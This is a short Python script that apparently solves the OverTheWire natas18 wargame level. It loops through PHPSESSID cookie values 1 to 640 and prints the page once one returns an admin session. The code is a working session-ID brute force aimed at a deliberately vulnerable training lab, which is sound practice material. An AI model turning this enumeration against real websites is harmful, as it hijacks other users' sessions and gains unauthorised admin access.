import requests

url = ("http://natas18.natas.labs.overthewire.org")
auth = ("natas18", "secret")

for sess_id in range(1, 641):
    my_cookies = {"PHPSESSID": str(sess_id)}
    response = requests.get(url, cookies=my_cookies, auth=auth)

    print(f"Checking ID: {sess_id}. . .", end="\r") # Visual counter of BruteForce

    if "you are an admin" in response.text.lower(): # finding the unique text in response.text
        print(f"[+]Admin session was found! ID: {sess_id}")
        print(response.text)
        break